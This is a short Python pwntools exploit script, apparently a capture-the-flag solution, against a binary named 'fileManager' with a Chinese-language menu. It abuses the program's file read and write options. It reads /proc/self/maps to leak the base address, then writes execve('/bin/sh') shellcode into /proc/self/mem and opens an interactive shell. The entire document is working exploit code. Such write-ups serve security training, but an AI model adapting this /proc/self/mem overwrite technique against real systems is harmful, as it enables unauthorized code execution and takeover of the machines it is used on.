#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.binary = "./fileManager"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

io = process("./fileManager")

def read(name, offset, length):
    io.sendlineafter("3. 退出\n", "1")
    io.sendlineafter("模块名称:", name)
    io.sendlineafter("查找模块偏移量:", str(offset))
    io.sendlineafter("模块读取大小:", str(length))
    io.recvuntil("模块内容")

def write(name, offset, length, content):
    io.sendlineafter("3. 退出\n", "2")
    io.sendlineafter("模块名称:", name)
    io.sendlineafter("写入模块偏移量:", str(offset))
    io.sendlineafter("模块写入大小:", str(length))
    io.sendlineafter("写入模块:", content)

def exp():
    io.sendlineafter("请登录FTP:", "m4x")
    read("/proc/self/maps", 0, 0x100)
    base = int(io.recvuntil("-", drop = True), 16)
    info("base -> 0x%x" % base)
    #  gdb.attach(io, "b *{} + 0x10C8\nc".format(base))
    shellcode = asm(shellcraft.execve("/bin/sh"))
    write("/proc/self/mem", base + 0x1154, 0x100, shellcode)

    io.interactive()
    io.close()

if __name__ == "__main__":
    exp()
